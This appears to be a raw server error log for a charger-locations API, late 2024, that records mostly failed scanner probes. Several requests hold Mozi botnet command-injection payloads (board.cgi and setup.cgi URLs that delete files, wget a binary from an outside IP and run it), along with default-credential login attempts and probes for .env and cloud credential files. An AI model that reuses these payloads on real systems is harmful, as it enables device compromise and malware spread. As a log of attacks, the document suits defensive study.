2024-10-23T09:31:04.735Z [31merror[39m: [POST] /charger-locations/add-charger - 401 [4ms]
2024-10-23T09:31:10.876Z [31merror[39m: [POST] /charger-locations/add-charger - 500 [8ms]
2024-10-24T07:05:56.032Z [31merror[39m: [POST] /charger-locations/add-charger - 500 [3ms]
2024-10-24T07:06:21.871Z [31merror[39m: [POST] /charger-locations/add-charger - 500 [6ms]
2024-10-24T07:08:16.169Z [31merror[39m: [POST] /charger-locations/add-charger - 500 [7ms]
2024-10-24T07:09:01.914Z [31merror[39m: [POST] /charger-locations/add-charger - 500 [4ms]
2024-11-06T07:52:55.940Z [31merror[39m: [GET] /get/pagination?page=1&limit=10 - 404 [4ms]
2024-11-06T07:53:18.815Z [31merror[39m: [GET] /user/get/pagination?page=1&limit=10 - 404 [2ms]
2024-11-06T07:53:22.253Z [31merror[39m: [GET] /users/get/pagination?page=1&limit=10 - 401 [4ms]
2024-11-06T07:55:55.170Z [31merror[39m: [GET] /users/get/pagination?page=1&limit=10 - 401 [8ms]
2024-12-03T11:43:11.331Z [31merror[39m: [GET] /aaa9 - 404 [3ms]
2024-12-03T11:43:19.589Z [31merror[39m: [GET] /aab8 - 404 [1ms]
2024-12-03T16:28:50.309Z [31merror[39m: [GET] /favicon.ico - 404 [2ms]
2024-12-03T16:59:21.264Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-03T21:56:17.412Z [31merror[39m: [GET] /hudson - 404 [2ms]
2024-12-03T23:57:54.472Z [31merror[39m: [GET] /boaform/admin/formLogin?username=ec8&psd=ec8 - 404 [0ms]
2024-12-04T00:27:45.302Z [31merror[39m: [GET] /download/powershell/ - 404 [1ms]
2024-12-04T00:27:45.571Z [31merror[39m: [GET] /get.php - 404 [0ms]
2024-12-04T00:58:53.458Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-04T03:11:53.545Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-04T08:58:25.344Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [3ms]
2024-12-04T09:13:55.922Z [31merror[39m: [GET] /geoserver/web/ - 404 [1ms]
2024-12-04T10:02:07.773Z [31merror[39m: [GET] /boaform/admin/formLogin?username=user&psd=user - 404 [1ms]
2024-12-04T10:28:06.504Z [31merror[39m: [GET] /charger-locations - 401 [1ms]
2024-12-04T10:55:23.265Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-04T10:55:23.657Z [31merror[39m: [GET] /sitemap.xml - 404 [0ms]
2024-12-04T10:55:23.659Z [31merror[39m: [GET] /robots.txt - 404 [1ms]
2024-12-04T17:00:52.614Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [2ms]
2024-12-04T19:13:48.903Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-04T21:40:57.492Z [31merror[39m: [GET] /download/powershell/ - 404 [1ms]
2024-12-04T21:40:57.800Z [31merror[39m: [GET] /get.php - 404 [1ms]
2024-12-05T00:57:05.226Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-05T06:43:57.352Z [31merror[39m: [GET] /charger-locations - 401 [1ms]
2024-12-05T08:58:56.551Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [2ms]
2024-12-05T10:01:38.957Z [31merror[39m: [GET] /download/powershell/ - 404 [2ms]
2024-12-05T10:01:39.351Z [31merror[39m: [GET] /get.php - 404 [1ms]
2024-12-05T11:47:24.058Z [31merror[39m: [GET] /charger-locations/location-type-count - 401 [1ms]
2024-12-05T11:47:28.522Z [31merror[39m: [GET] /charger-locations/location-type-count - 500 [7ms]
2024-12-05T16:58:36.021Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [3ms]
2024-12-05T20:08:46.756Z [31merror[39m: [GET] /index.html - 404 [2ms]
2024-12-06T00:17:49.547Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-06T00:19:05.850Z [31merror[39m: [GET] /geoserver/web/ - 404 [1ms]
2024-12-06T00:55:42.272Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-06T06:57:38.029Z [31merror[39m: [GET] /favicon.ico - 404 [2ms]
2024-12-06T08:54:53.534Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-06T09:40:09.133Z [31merror[39m: [GET] /boaform/admin/formLogin?username=adminisp&psd=adminisp - 404 [1ms]
2024-12-06T10:16:15.687Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-06T12:01:09.927Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-06T12:48:59.474Z [31merror[39m: [GET] /aaa9 - 404 [1ms]
2024-12-06T12:49:03.736Z [31merror[39m: [GET] /aab8 - 404 [1ms]
2024-12-06T14:02:19.537Z [31merror[39m: [GET] /actuator/health - 404 [1ms]
2024-12-06T16:42:40.835Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-06T16:55:31.547Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-06T20:55:42.513Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-07T00:05:29.953Z [31merror[39m: [POST] /boaform/admin/formLogin - 404 [1ms]
2024-12-07T00:55:20.528Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-07T07:11:00.704Z [31merror[39m: [GET] /hudson - 404 [1ms]
2024-12-07T07:54:41.505Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-07T08:11:16.716Z [31merror[39m: [POST] /sdk - 404 [1ms]
2024-12-07T08:11:16.719Z [31merror[39m: [GET] /nmaplowercheck1733559076 - 404 [0ms]
2024-12-07T08:11:17.185Z [31merror[39m: [GET] /HNAP1 - 404 [0ms]
2024-12-07T08:11:17.191Z [31merror[39m: [GET] /evox/about - 404 [0ms]
2024-12-07T08:57:31.967Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-07T15:25:04.456Z [31merror[39m: [GET] /boaform/admin/formLogin?username=admin&psd=admin - 404 [2ms]
2024-12-07T16:55:49.672Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-08T00:54:41.514Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [2ms]
2024-12-08T05:55:51.767Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-08T06:12:55.732Z [31merror[39m: [GET] /download/powershell/ - 404 [1ms]
2024-12-08T06:12:56.156Z [31merror[39m: [GET] /get.php - 404 [1ms]
2024-12-08T09:34:20.501Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-08T17:36:25.680Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-08T23:54:30.091Z [31merror[39m: [GET] /download/powershell/ - 404 [2ms]
2024-12-08T23:54:30.614Z [31merror[39m: [GET] /get.php - 404 [0ms]
2024-12-09T00:36:11.411Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-09T00:36:46.168Z [31merror[39m: [GET] /geoserver/web/ - 404 [0ms]
2024-12-09T01:34:25.521Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-09T03:35:48.612Z [31merror[39m: [GET] /manager/text/list - 404 [1ms]
2024-12-09T07:20:44.953Z [31merror[39m: [GET] /charger-locations - 401 [1ms]
2024-12-09T09:10:36.459Z [31merror[39m: [GET] /download/powershell/ - 404 [1ms]
2024-12-09T09:10:36.862Z [31merror[39m: [GET] /get.php - 404 [1ms]
2024-12-09T09:40:09.125Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-09T14:33:45.071Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-09T14:33:45.391Z [31merror[39m: [GET] /robots.txt - 404 [1ms]
2024-12-09T14:33:45.623Z [31merror[39m: [GET] /sitemap.xml - 404 [1ms]
2024-12-09T14:33:45.941Z [31merror[39m: [GET] /config.json - 404 [0ms]
2024-12-09T15:22:19.069Z [31merror[39m: [GET] /boaform/admin/formLogin?username=admin&psd=admin - 404 [0ms]
2024-12-09T15:26:05.469Z [31merror[39m: [GET] /manager/html - 404 [1ms]
2024-12-09T17:35:21.242Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-09T18:33:31.036Z [31merror[39m: [GET] /actuator/env - 404 [0ms]
2024-12-09T19:14:13.410Z [31merror[39m: [GET] /aaa9 - 404 [1ms]
2024-12-09T19:14:15.780Z [31merror[39m: [GET] /aab8 - 404 [1ms]
2024-12-10T00:14:16.130Z [31merror[39m: [GET] /actuator/health - 404 [2ms]
2024-12-10T01:34:35.969Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-10T02:10:28.344Z [31merror[39m: [GET] /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.199.21.66:51671/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron - 404 [1ms]
2024-12-10T06:34:57.578Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-10T09:46:16.413Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-10T09:49:48.007Z [31merror[39m: [GET] /download/powershell/ - 404 [0ms]
2024-12-10T09:49:48.417Z [31merror[39m: [GET] /get.php - 404 [1ms]
2024-12-10T12:47:22.790Z [31merror[39m: [HEAD] /core/auth/login/ - 404 [1ms]
2024-12-10T14:48:40.766Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-10T14:49:59.246Z [31merror[39m: [GET] /geoserver/web/ - 404 [1ms]
2024-12-10T16:31:28.206Z [31merror[39m: [GET] /securityRealm/user/admin/search/index?q=a - 404 [0ms]
2024-12-10T16:36:25.337Z [31merror[39m: [GET] /hudson - 404 [1ms]
2024-12-10T16:38:51.688Z [31merror[39m: [POST] /Autodiscover/Autodiscover.xml - 404 [0ms]
2024-12-10T16:42:45.854Z [31merror[39m: [POST] /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 404 [1ms]
2024-12-10T16:45:44.668Z [31merror[39m: [GET] /download/powershell/ - 404 [1ms]
2024-12-10T16:45:45.073Z [31merror[39m: [GET] /get.php - 404 [0ms]
2024-12-10T17:39:05.911Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-11T01:28:01.501Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-11T08:36:43.591Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-11T09:36:19.154Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-11T11:17:00.832Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-11T11:17:01.110Z [31merror[39m: [GET] /robots.txt - 404 [0ms]
2024-12-11T11:17:01.113Z [31merror[39m: [GET] /sitemap.xml - 404 [1ms]
2024-12-11T14:26:37.424Z [31merror[39m: [GET] /aws.yml - 404 [1ms]
2024-12-11T16:25:31.491Z [31merror[39m: [GET] /nmaplowercheck1733934331 - 404 [1ms]
2024-12-11T16:25:31.499Z [31merror[39m: [POST] /sdk - 404 [0ms]
2024-12-11T16:25:31.967Z [31merror[39m: [GET] /HNAP1 - 404 [1ms]
2024-12-11T16:25:31.969Z [31merror[39m: [GET] /evox/about - 404 [0ms]
2024-12-11T17:45:35.417Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-11T20:30:08.222Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-12T01:36:20.434Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-12T02:02:45.994Z [31merror[39m: [GET] /nacos/ - 404 [1ms]
2024-12-12T05:32:29.616Z [31merror[39m: [GET] /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://120.138.12.255:52312/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron - 404 [1ms]
2024-12-12T09:43:41.683Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-12T12:03:01.012Z [31merror[39m: [GET] /aaa9 - 404 [1ms]
2024-12-12T12:03:22.038Z [31merror[39m: [GET] /aab8 - 404 [0ms]
2024-12-12T15:43:26.307Z [31merror[39m: [GET] /boaform/admin/formLogin?username=adminisp&psd=adminisp - 404 [0ms]
2024-12-12T16:19:07.031Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-12T17:33:40.772Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-12T21:08:57.143Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-13T01:31:30.605Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-13T04:40:54.202Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-13T04:42:15.212Z [31merror[39m: [GET] /geoserver/web/ - 404 [1ms]
2024-12-13T08:29:51.733Z [31merror[39m: [GET] /nmaplowercheck1734078591 - 404 [0ms]
2024-12-13T08:29:51.737Z [31merror[39m: [POST] /sdk - 404 [0ms]
2024-12-13T08:29:52.154Z [31merror[39m: [GET] /evox/about - 404 [1ms]
2024-12-13T08:29:52.203Z [31merror[39m: [GET] /HNAP1 - 404 [1ms]
2024-12-13T09:28:00.952Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-13T12:08:59.919Z [31merror[39m: [GET] /actuator/health - 404 [0ms]
2024-12-13T17:10:09.747Z [31merror[39m: [GET] /favicon.ico - 404 [2ms]
2024-12-13T17:24:08.333Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-13T18:01:33.794Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-14T01:18:24.170Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-14T04:16:04.725Z [31merror[39m: [GET] /hudson - 404 [0ms]
2024-12-14T09:29:46.485Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-14T17:26:04.225Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-15T01:24:44.451Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-15T05:19:28.287Z [31merror[39m: [GET] /download/powershell/ - 404 [0ms]
2024-12-15T05:19:28.686Z [31merror[39m: [GET] /get.php - 404 [1ms]
2024-12-15T06:46:20.206Z [31merror[39m: [GET] /aaa9 - 404 [1ms]
2024-12-15T06:46:33.182Z [31merror[39m: [GET] /aab8 - 404 [0ms]
2024-12-15T09:25:14.021Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-15T17:28:53.731Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-16T01:31:35.843Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-16T07:57:11.131Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-16T07:57:47.725Z [31merror[39m: [GET] /geoserver/web/ - 404 [0ms]
2024-12-16T09:27:39.191Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [2ms]
2024-12-16T10:32:23.949Z [31merror[39m: [GET] /1734345143 - 404 [0ms]
2024-12-16T10:32:24.352Z [31merror[39m: [GET] /evox/about - 404 [0ms]
2024-12-16T10:32:24.403Z [31merror[39m: [GET] /HNAP1 - 404 [1ms]
2024-12-16T10:32:24.803Z [31merror[39m: [POST] /sdk - 404 [1ms]
2024-12-16T10:32:47.460Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-16T14:05:25.302Z [31merror[39m: [GET] /manager/text/list - 404 [1ms]
2024-12-16T14:49:17.237Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-16T14:49:17.420Z [31merror[39m: [GET] /robots.txt - 404 [0ms]
2024-12-16T14:49:17.608Z [31merror[39m: [GET] /sitemap.xml - 404 [0ms]
2024-12-16T14:49:17.793Z [31merror[39m: [GET] /config.json - 404 [0ms]
2024-12-16T17:26:34.857Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-16T20:11:41.708Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-16T23:52:47.328Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-17T00:13:49.534Z [31merror[39m: [GET] /actuator/health - 404 [1ms]
2024-12-17T01:14:11.215Z [31merror[39m: [GET] /manager/html - 404 [1ms]
2024-12-17T01:27:48.867Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-17T09:22:50.579Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [2ms]
2024-12-17T09:31:52.806Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-17T09:53:30.279Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-17T10:20:09.211Z [31merror[39m: [GET] /aaa9 - 404 [0ms]
2024-12-17T10:20:37.489Z [31merror[39m: [GET] /aab8 - 404 [1ms]
2024-12-17T12:40:14.439Z [31merror[39m: [GET] /hudson - 404 [1ms]
2024-12-17T15:49:30.487Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-17T15:50:58.746Z [31merror[39m: [GET] /geoserver/web/ - 404 [0ms]
2024-12-17T17:24:19.534Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-17T18:35:43.367Z [31merror[39m: [GET] http://ifconfig.co/country-iso - 404 [1ms]
2024-12-18T01:28:42.326Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-18T02:08:05.082Z [31merror[39m: [GET] http://ifconfig.co/country-iso - 404 [1ms]
2024-12-18T03:46:32.277Z [31merror[39m: [GET] /boaform/admin/formLogin?username=adminisp&psd=adminisp - 404 [0ms]
2024-12-18T06:04:26.206Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-18T09:27:36.108Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-18T10:18:04.177Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-18T10:18:54.250Z [31merror[39m: [GET] /geoserver/web/ - 404 [1ms]
2024-12-18T11:14:26.170Z [31merror[39m: [POST] /upload.action - 404 [1ms]
2024-12-18T16:48:32.262Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-18T16:48:47.051Z [31merror[39m: [GET] /manage/account/login - 404 [1ms]
2024-12-18T16:49:01.816Z [31merror[39m: [GET] /admin/index.html - 404 [1ms]
2024-12-18T16:49:16.865Z [31merror[39m: [GET] /index.html - 404 [1ms]
2024-12-18T16:49:31.417Z [31merror[39m: [GET] /+CSCOE+/logon.html - 404 [0ms]
2024-12-18T16:49:44.869Z [31merror[39m: [GET] /cgi-bin/login.cgi - 404 [1ms]
2024-12-18T16:49:59.551Z [31merror[39m: [GET] /logon.htm - 404 [1ms]
2024-12-18T16:50:13.342Z [31merror[39m: [GET] /login.jsp - 404 [0ms]
2024-12-18T16:50:29.054Z [31merror[39m: [GET] /doc/index.html - 404 [0ms]
2024-12-18T17:28:29.946Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [2ms]
2024-12-18T19:17:31.765Z [31merror[39m: [GET] /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - 404 [1ms]
2024-12-18T19:47:44.399Z [31merror[39m: [GET] /boaform/admin/formLogin?username=admin&psd=admin - 404 [0ms]
2024-12-18T22:23:34.522Z [31merror[39m: [GET] /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.94.44.155:48102/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - 404 [1ms]
2024-12-19T01:22:11.047Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
2024-12-19T01:22:30.876Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-19T03:04:27.218Z [31merror[39m: [GET] /aaa9 - 404 [1ms]
2024-12-19T03:04:55.023Z [31merror[39m: [GET] /aab8 - 404 [1ms]
2024-12-19T05:12:30.377Z [31merror[39m: [GET] /_profiler/phpinfo - 404 [1ms]
2024-12-19T05:12:31.240Z [31merror[39m: [GET] /frontend_dev.php/$ - 404 [1ms]
2024-12-19T05:12:31.638Z [31merror[39m: [GET] /.env - 404 [1ms]
2024-12-19T05:12:32.039Z [31merror[39m: [PUT] / - 404 [1ms]
2024-12-19T05:54:42.569Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-19T07:05:22.291Z [31merror[39m: [GET] /extra/portal/../../cgi-bin/history.sh - 404 [2ms]
2024-12-19T09:23:57.213Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-19T09:48:36.199Z [31merror[39m: [GET] /download/powershell/ - 404 [0ms]
2024-12-19T09:48:36.324Z [31merror[39m: [GET] /get.php - 404 [0ms]
2024-12-19T11:29:54.032Z [31merror[39m: [GET] /geoserver/web/ - 404 [1ms]
2024-12-19T17:31:09.849Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-19T18:01:54.800Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-19T18:23:54.811Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-19T18:23:55.017Z [31merror[39m: [GET] /robots.txt - 404 [1ms]
2024-12-19T18:23:55.100Z [31merror[39m: [GET] /sitemap.xml - 404 [1ms]
2024-12-19T23:12:04.404Z [31merror[39m: [GET] /boaform/admin/formLogin?username=user&psd=user - 404 [1ms]
2024-12-19T23:12:28.381Z [31merror[39m: [POST] /login.cgi - 404 [4ms]
2024-12-19T23:12:28.482Z [31merror[39m: [POST] /cgi-bin/luci;stok=/locale - 404 [49ms]
2024-12-20T01:28:49.057Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
2024-12-20T01:42:49.227Z [31merror[39m: [GET] /boaform/admin/formLogin?username=adminisp&psd=adminisp - 404 [1ms]
2024-12-20T02:31:39.126Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
2024-12-20T06:21:59.122Z [31merror[39m: [GET] /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - 404 [1ms]
2024-12-20T06:36:37.482Z [31merror[39m: [GET] /favicon.ico - 404 [0ms]
2024-12-05T10:54:09.951Z [31merror[39m: [POST] /charger-locations/location/filter/site-survey - 401 [3ms]
2024-12-05T10:54:45.360Z [31merror[39m: [GET] /charger-locations/type - 401 [2ms]
